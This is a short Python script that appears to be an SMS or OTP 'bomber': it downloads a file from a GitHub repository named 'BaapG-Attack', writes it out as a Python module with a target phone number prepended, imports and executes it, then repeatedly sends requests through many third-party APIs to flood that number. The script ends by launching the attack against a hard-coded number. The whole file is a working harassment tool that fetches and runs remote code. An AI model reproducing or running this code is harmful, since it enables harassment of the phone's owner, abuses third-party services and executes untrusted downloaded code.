import requests
import os

def prepend_line(file_name, line):
    dummy_file = file_name + '.bak'
    with open(file_name, 'r') as read_obj, open(dummy_file, 'w') as write_obj:
        write_obj.write(line + '\n')
        for line in read_obj:
            write_obj.write(line)
    os.remove(file_name)
    os.rename(dummy_file, file_name)


def getApi(target):
	apiUrl = "https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/apiData.baap"
	try:
		a = requests.get(apiUrl)
		open('dataBa.py', 'wb').write(a.content)
		prepend_line('dataBa.py',f'target = {target}')
		import dataBa
		from dataBa import apis, apidata
	except Exception as e:
		return exit(str(e))
	return {"apis":apis,"apidata":apidata,"total":len(apis)}

				
def bomb(times1,target):
	finalApi = getApi(target)
	apis = finalApi["apis"]
	apidata = finalApi["apidata"]
	total = finalApi["total"]
	times = round(times1/total)
	if times == 0:
		times = 1
	print ("Total apis : "+str(total)+"\nNumber of times to send : "+str(times1))
		
	success =0
	fail =0
	for i in range(0,times):
		for api in apis:
			if "POST" in api:
				url,data,head,method,check = api
				try:
					a = requests.post(url,data=data,headers=head)
					if check in a.text:
						success += 1
					else:
						print (a.text,url)
						fail += 1
				except Exception as e:
					print(str(e))
					fail += 1
				print("\r"+"Success : "+str(success)+" Error : "+str(fail),end="")
			elif "GET" in api:
				url,head,method,check = api
				try:
					a = requests.get(url,headers=head)
					if check in a.text:
						success += 1
					else:
						print(a.text)
						fail += 1
				except Exception:
					print(str(e))
					fail += 1
				print("\r"+"Success : "+str(success)+" Error : "+str(fail),end="")
			else:
				print ("Unexpectedly Error")
				return exit()
			
		continue
	return success,fail

success,fail = bomb(4,"8556801792")